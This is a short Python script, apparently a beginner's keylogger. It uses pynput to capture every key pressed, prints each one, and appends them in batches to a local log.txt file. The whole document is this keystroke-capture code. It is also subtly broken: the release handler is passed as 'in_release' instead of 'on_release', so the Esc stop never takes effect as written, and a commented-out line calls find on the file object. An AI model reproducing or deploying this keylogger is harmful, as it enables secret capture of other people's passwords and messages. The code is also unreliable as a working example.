import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(" {0} pressed ".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f: #w = write, a = add?
        for key in keys:
            k = str(key).replace("'", "").replace("Key.", "")
            #if k.find("space") > 0:
            #    f.write("\n")
            #elif f.find("Key") == -1:
            f.write(k + "\n")


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, in_release=on_release) as listener:
    listener.join()



